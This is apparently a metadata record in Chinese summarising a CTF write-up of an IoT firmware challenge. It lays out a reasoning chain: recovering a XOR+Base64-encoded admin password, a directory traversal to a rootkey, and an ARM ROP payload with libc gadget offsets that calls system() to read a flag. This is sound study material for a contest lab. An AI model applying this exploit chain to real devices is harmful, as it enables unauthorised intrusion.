...
quality: high
full_path: 第八届强网拟态防御国际精英挑战赛_–_WIN！致敬mt_复现.full.md
meta_path: 第八届强网拟态防御国际精英挑战赛_–_WIN！致敬mt_复现.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第八届强网拟态防御国际精英挑战赛 - WIN!致敬mt 复现。第八届强网拟态防御IoT固件逆向,QEMU跑debian-armel-versatilepb,scp拉cgi-bin(auth.cgi/manage.cgi/upload.cgi/watch/session_check.cgi/lang.cgi)逆向XOR+Base64密码编码得8g323密码,目录穿越../rootkey+ARM...
category: misc
...
contest_type: open
wp_url: https://www.ctfiot.com/283883.html
reasoning_chain:
- IoT 固件题 → 触发点：QEMU 启动 debian-armel-versatilepb rootfs → scp 下载 /var/www/cgi-bin + lighttpd 二进制
- 假设：逆向 auth.cgi（0x03FC 限制 + 8 段循环 + XOR 编码）→ 观察：users.txt admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==
- 假设：xor_key='N1K_ROUT3R'（10 字节）→ 动作：base64 + 10 字节循环 XOR → 密码 8g323##a08h33zx33@!B!$$$$$$$
- 假设：login + upload_pubkey（80 字节 payload_store）→ set_publicfile(cnt1=80, cnt2=idx) → watch 创建 rootkey
- 假设：目录穿越 ../ × ((0x60-15)//2) + '/rootkey' + 'nik.gif' → download 触发 make_rop
- 假设：ARM ROP：pop {lr};bx lr(0x15b24+libc) + pop {r0,lr};bx lr(0x10c730+libc) + system(0x38d34+libc) + 'cat /home/ctf/flag > /tmp/store/logs.txt'
- 动作：rop=b'a'*0x24+p32(pop_lr)+p32(pop_r0_lr)+p32(args_addr)+p32(system)+cmd+'\x00'
- 假设：manage(action='manage', rk=rootkey) 执行 ROP + manage(action='logs') 读 log 得 flag
failed_attempts:
- 直接静态逆向 cgi-bin → 失败：必须 QEMU 启动 debian-armel-versatilepb + scp 拉二进制
- base64 直接解码 → 失败：必须 10 字节循环 XOR 还原
- libc ROP 直调 system → 失败：必须 pop {r0,lr};bx lr gadget
key_observations:
- IoT 固件逆向流程：QEMU 启动→scp/rsync 拉二进制→IDA/Ghidra 逆向→密码还原
- auth.cgi 密码编码：base64+10 字节循环 XOR（xor_key 常硬编码在二进制）
- ARM ROP gadget：pop {lr};bx lr(0x15b24+libc) + pop {r0,lr};bx lr(0x10c730+libc)
- shm_addr（共享内存）用于存放 system 参数（命令字符串）
- 目录穿越 (./../) 触发 make_rop 覆盖返回地址
prerequisites:
- QEMU 启动 ARM Linux rootfs
- scp/rsync 拉二进制 + IDA 逆向
- ARM 汇编 + ROP gadget 构造
- XOR 循环密码还原
---
